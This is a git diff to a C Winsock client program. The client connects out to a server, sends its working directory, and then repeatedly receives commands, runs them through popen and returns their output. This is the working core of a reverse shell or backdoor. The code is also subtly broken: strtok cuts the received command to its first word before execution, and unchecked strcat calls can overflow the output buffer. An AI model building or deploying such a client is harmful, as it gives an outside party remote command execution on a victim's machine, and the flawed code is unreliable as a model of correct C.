@@ -8,13 +8,15 @@ void startWinsock();
 SOCKET startSocket();
 void connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket,  const char* server_ip);
 void closeSocket(SOCKET client_socket);
-void sendMsg(SOCKET client_socket, const char *msg);
+void sendMsg(SOCKET client_socket, char *msg);
 void receiveCommand(SOCKET client_socket, char *rsp);
 
 int main(){
     
     char cmd_buff[1024];
+    char output_buff[1024];
     char cwd[1024];
+    FILE *output;
 
     SOCKET client_socket;
     struct sockaddr_in serv_addr;
@@ -25,11 +27,34 @@ int main(){
     startWinsock();
     client_socket = startSocket();
     connectToServer(&serv_addr, client_socket, server_ip);
+
+    getcwd(cwd, 1024);
+    sendMsg(client_socket, cwd);
+
     while (1){
-        getcwd(cwd, 1024);
-        sendMsg(client_socket, cwd);
+        
+        memset(cmd_buff, 0, 1024);
+        memset(output_buff, 0, 1024);
         receiveCommand(client_socket, cmd_buff);
         printf("%s\n", cmd_buff);
+        char* command = strtok(cmd_buff, " ");
+        if (strcmp(command, "cd") == 0){
+            // code for if the command was cd
+        } else {
+            // code for any other command aside from cd
+            output = popen(cmd_buff, "r"); 
+            while(1){
+                char line[1024];
+                int status = fscanf(output, "%[^\n]%*c", line);
+                if (status != 1){
+                    break;
+                }
+                strcat(output_buff, line);
+                strcat(output_buff, "\n");
+            }
+            // printf("output buffer: %s\n", output_buff);
+            sendMsg(client_socket, output_buff);
+        }
     }
     return 1;
 }
@@ -73,7 +98,7 @@ void connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket, const 
     }
 }
 
-void sendMsg(SOCKET client_socket, const char *msg) {
+void sendMsg(SOCKET client_socket, char *msg) {
     int sent = send(client_socket, msg, strlen(msg), 0);
     if (sent == -1){
         printf("Error sending message. The connection must have been cut.\n");
